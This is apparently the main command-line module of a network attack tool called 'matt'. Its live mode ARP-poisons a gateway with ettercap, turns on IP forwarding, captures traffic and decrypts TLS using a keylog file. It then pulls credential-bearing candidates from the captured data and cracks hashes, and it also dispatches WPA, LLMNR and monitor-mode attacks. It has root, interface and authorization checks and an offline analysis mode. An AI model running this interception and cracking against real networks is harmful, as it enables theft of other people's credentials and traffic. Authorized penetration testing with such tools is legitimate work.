            marker = _c("  [i] ", "cyan")               # recon
            label = _c(label, "cyan")
        else:
            marker = _c("  [-] ", "dim")
            label = _c(label, "bold")
        print(marker + label + ("  " + tag if tag else ""))
        print("      " + f["prose"])
    if not findings:
        print(_c("  (no candidates in this report: nothing decoded, "
                 "nothing claimed)", "dim"))


def _report_from_hashes(path) -> dict:
    """Build a candidate report from a plain hash file (one hash per line). Each
    line is classified with type_hash so a known hash carries its hashcat mode
    and can be cracked; blank lines and ``#`` comments are skipped."""
    cands = []
    with open(path, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            kind, mode = _core.type_hash(line.encode())
            cand = {"candidate": line, "kind": kind if kind != "unknown" else "hash",
                    "hashcat_mode": mode, "decoded_via": "hash-file"}
            if mode:
                cand["credential_bearing"] = True
            cands.append(cand)
    return {"candidates": cands}


def run_offline(args, parser=None) -> int:
    """--analyze-only: read, decode, prose, write. No network, ever."""
    _show_banner(args)
    path = args.analyze_only
    if not os.path.exists(path):
        sys.stderr.write(f"matt: no such capture report: {path}\n")
        return EXIT_CONFIG
    try:
        report = _core.read_report(path)
    except ValueError as exc:
        # Not a JSON capture report. If it isn't even shaped like JSON, treat it
        # as a plain hash file -- one hash per line, e.g. a matt-wpa.22000 the
        # --wpa step just produced, or any .22000/NTLM/Kerberos dump -- so it can
        # be analyzed and cracked directly.
        head = ""
        try:
            with open(path, encoding="utf-8", errors="replace") as fh:
                head = fh.read(64).lstrip()
        except OSError:
            pass
        if head[:1] in ("{", "["):
            sys.stderr.write(f"matt: {path} is not valid JSON: {exc}\n")
            return EXIT_CONFIG
        report = _report_from_hashes(path)
        if not report["candidates"]:
            sys.stderr.write(f"matt: {path} is neither a capture report nor a "
                             "recognizable hash file\n")
            return EXIT_CONFIG
    except OSError as exc:
        sys.stderr.write(f"matt: cannot read {path}: {exc}\n")
        return EXIT_CONFIG

    try:
        writer = _model_writer(args)
    except _model.ModelConfigError as exc:
        sys.stderr.write(f"matt: {exc}\n")
        return EXIT_MODEL

    # A default run never sends the report anywhere: the writer is None, so
    # analyze() uses the built-in prose writer and makes no request. The one
    # exception is an explicit --model-url, which is the operator naming an
    # endpoint rather than MATT guessing one (model.resolve_endpoint).
    model_kwargs = {"env": dict(os.environ)}
    if args.use_model and args.model_url:
        model_kwargs["base_url"] = args.model_url
    analysis = _core.analyze(report, model=writer, **model_kwargs)
    out = args.analysis or os.path.join(
        os.path.dirname(os.path.abspath(path)) or ".", "matt_analysis.json")
    _core.write_report(analysis, out)

    stats = analysis["analysis"]
    findings = stats["findings"]
    _auto_reverse(findings)
    if args.as_json:
        if args.crack:
            _annotate_crack(findings, args)
        print(json.dumps({"source": path, **stats}, ensure_ascii=False, indent=2))
        return EXIT_OK
    cb = stats["credential_bearing"]
    nc = stats["network_calls"]
    print(f"offline analysis of {path}")
    print(f"  hosts seen:          {stats['host_count']}")
    print(f"  candidates decoded:  {stats['candidate_count']}")
    print(f"  credential-bearing:  "
          + (_c(str(cb), "green", "bold") if cb else _c(str(cb), "dim")))
    print(f"  prose engine:        {stats['engine']}")
    print(f"  network calls made:  "
          + (_c(str(nc), "red", "bold") if nc else _c(str(nc), "dim")))
    print(f"  written to:          {out}")
    if args.as_table:
        if args.crack:
            _annotate_crack(findings, args)
        _print_table(findings)
    else:
        # --crack first: it sets f["plaintext"] on each cracked finding in
        # place, which is what tells _print_findings to mark it [+] green
        # instead of [#] yellow. Printing first and cracking after (the
        # order this used to run in) meant the findings listing always
        # showed a just-cracked credential as still uncracked, with the
        # real result only visible in the separate crack summary below it.
        if args.crack:
            _run_crack(findings, args)
        if args.pretty or not findings:
            _print_findings(findings)
    return EXIT_OK


def run_live(args, parser) -> int:
    """Live stage 1 + stage 2. Precondition checks first, all of them."""
    _show_banner(args)
    if args.dry_run:
        print("dry run, nothing was opened:")
        print(json.dumps({"root": "skipped (dry run)",
                          "interface": args.iface or "unset",
                          "authorization": bool(args.authorized)}, indent=2))
        return EXIT_OK

    try:
        _capture.require_root(args.euid)
        if not args.iface:
            raise FileNotFoundError(
                "a live capture needs --iface NAME; use --analyze-only REPORT to "
                "work offline")
        _capture.require_interface(args.iface)
        _capture.require_authorization(args.authorized)
    except (PermissionError, FileNotFoundError) as exc:
        sys.stderr.write(f"matt: refusing to run: {exc}\n")
        return EXIT_CONFIG

    try:
        writer = _model_writer(args)
    except _model.ModelConfigError as exc:
        sys.stderr.write(f"matt: {exc}\n")
        return EXIT_MODEL

    started = _core.utc_now()
    try:
        gateway = args.gateway or _capture.discover_gateway()
    except _capture.GatewayDiscoveryError as exc:
        sys.stderr.write(f"matt: {exc}\n")
        return EXIT_LIVE

    clients = _capture.discover_clients()
    neighbors = _capture.neighbor_table()   # ip -> mac, for device-name labelling
    poison = {"skipped": True, "reason": "--no-poison"}
    if not args.no_poison:
        poison = _capture.start_ettercap(args.iface, gateway)
        if not poison.get("started"):
            sys.stderr.write(f"matt: ettercap not running: {poison['reason']}\n")
        elif poison.get("ip_forward_enabled"):
            print(_c("  enabled net.ipv4.ip_forward (needed so poisoned traffic "
                     "actually passes through this host)", "dim"))

    pcap_path = None
    if args.keylog:
        pcap_path = os.path.join(
            os.path.dirname(os.path.abspath(args.report)) or ".", "matt-live.pcap")
    t0 = time.monotonic()
    try:
        sniff = _capture.capture_payloads(
            args.iface, duration=args.duration, capture_tool=args.capture_tool,
            runner=args.runner, max_packets=args.max_packets, pcap_path=pcap_path)
    finally:
        if poison.get("pid"):
            _capture.stop_poison(poison)

    payloads = sniff["payloads"]
    if args.keylog:
        if pcap_path and os.path.isfile(pcap_path):
            tls = _tlsdecrypt.decrypt_pcap(pcap_path, args.keylog)
        else:
            tls = {"streams": 0, "payloads": [], "note": "no pcap was saved, "
                   "so there was nothing to decrypt"}
        payloads.extend(tls["payloads"])
        sniff["tls_keylog"] = {k: v for k, v in tls.items() if k != "payloads"}
        sniff["tls_keylog"]["decrypted"] = len(tls["payloads"])
    hosts = {"the wire": {"payloads": payloads}}

    versions = {}
    for tool in (args.capture_tool, "tcpdump", "tshark", "ettercap"):
        if tool and shutil.which(tool) and tool not in versions:
            try:
                proc = subprocess.run([tool, "--version"], capture_output=True,
                                      text=True, timeout=5, check=False)
                versions[tool] = ((proc.stdout or proc.stderr).splitlines() or [""])[0]
            except (OSError, subprocess.SubprocessError):
                versions[tool] = "present, version unknown"

    report = _capture.build_report(
        iface=args.iface, payloads=payloads, hosts=hosts, gateway=gateway,
        clients=clients, neighbors=neighbors,
        capture={k: v for k, v in sniff.items() if k != "payloads"},
        poison=poison, duration=round(time.monotonic() - t0, 3),
        tool_versions=versions, started=started, finished=_core.utc_now(),
        mode="live")
    _core.write_report(report, args.report)

    model_kwargs = {"env": dict(os.environ)}
    if args.use_model and args.model_url:
        model_kwargs["base_url"] = args.model_url
    analysis = _core.analyze(report, model=writer, **model_kwargs)
    out = args.analysis or os.path.join(
        os.path.dirname(os.path.abspath(args.report)) or ".", "matt_analysis.json")
    _core.write_report(analysis, out)

    stats = analysis["analysis"]
    _auto_reverse(stats["findings"])
    if args.as_json:
        if args.crack:
            _annotate_crack(stats["findings"], args)
        print(json.dumps({"iface": args.iface, "report": args.report, **stats},
                         ensure_ascii=False, indent=2))
        return EXIT_OK
    cb = stats["credential_bearing"]
    nc = stats["network_calls"]
    print(f"live capture on {args.iface} via {sniff['tool']}")
    print(f"  gateway:             {gateway}")
    print(f"  clients seen:        {len(clients)}")
    print(f"  payloads captured:   {len(payloads)}")
    if args.keylog:
        tls_info = sniff["tls_keylog"]
        print(f"  TLS sessions:        {tls_info['streams']} "
              f"({tls_info['decrypted']} payload(s) decrypted)")
        if tls_info.get("note"):
            print(f"  TLS note:            {tls_info['note']}")
    print(f"  candidates decoded:  {stats['candidate_count']}")
    print(f"  credential-bearing:  "
          + (_c(str(cb), "green", "bold") if cb else _c(str(cb), "dim")))
    print(f"  prose engine:        {stats['engine']}")
    print(f"  network calls made:  "
          + (_c(str(nc), "red", "bold") if nc else _c(str(nc), "dim")))
    if sniff.get("note"):
        print(f"  capture note:        {sniff['note']}")
    print(f"  written to:          {args.report}")
    print(f"                       {out}")
    if nc:
        print(_c(f"  NOTE: --use-model was passed, so this run DID make "
                 f"{nc} HTTP request(s).", "red"))
    if args.as_table:
        if args.crack:
            _annotate_crack(stats["findings"], args)
        _print_table(stats["findings"])
    else:
        # Same ordering reason as run_offline: crack first so a just-cracked
        # finding shows [+] green in the listing below it, not [#] yellow.
        if args.crack:
            _run_crack(stats["findings"], args)
        if args.pretty:
            _print_findings(stats["findings"])
    return EXIT_OK


def _route(args, parser) -> int:
    """Send already-parsed args to the right handler -- the single path both
    ``main()`` and the menu's ``dispatch`` go through, so a menu action can
    never silently fall through to the wrong runner (this used to happen: the
    menu's WPA/LLMNR/monitor-setup/dashboard/identify actions built the right
    argv, but the dispatch path only ever checked --analyze-only vs a live
    capture, so picking them from the menu quietly ran a plain ARP capture
    with the extra flags ignored instead of what the menu said it would do)."""
    if args.identify is not None:
        return _do_identify(args.identify)
    if args.dashboard is not None:
        return run_dashboard(args)
    if args.wpa:
        return run_wpa(args)
    if args.monitor_setup:
        return run_monitor_setup(args)
    if args.monitor_restore:
        return run_monitor_restore(args)
    if args.llmnr:
        return run_llmnr(args)
    if args.watch:
        return run_watch(args)
    if args.analyze_only:
        return run_offline(args, parser)
    return run_live(args, parser)


def _parse_and_run(argv, parser=None) -> int:
    """Parse an argv list and run it -- the single path the menu and the flags
    both go through, so the two can never drift apart."""
    parser = parser or build_parser()
    args = parser.parse_args(argv)
    return _route(args, parser)


def main(argv=None) -> int:
    parser = build_parser()
    if argv is None:
        argv = sys.argv[1:]
    args = parser.parse_args(argv)

    # No arguments in a real terminal -> the friendly menu. Explicit --menu/-i
    # forces it even with other flags present. A piped or scripted run (no tty)
    # never gets the menu: it would otherwise block forever on input() in a cron
    # job or a test.
    if args.menu or (not argv and _is_interactive()):
        from . import ui
        return ui.run_menu(parser, lambda a: _parse_and_run(a, parser))

    # No arguments and no terminal to drive a menu (a pipe, a redirect): show
    # help and exit cleanly instead of falling through to a live run with no
    # interface, which would just error.
    if not argv:
        parser.print_help()
        return EXIT_OK

    return _route(args, parser)


if __name__ == "__main__":
    sys.exit(main())
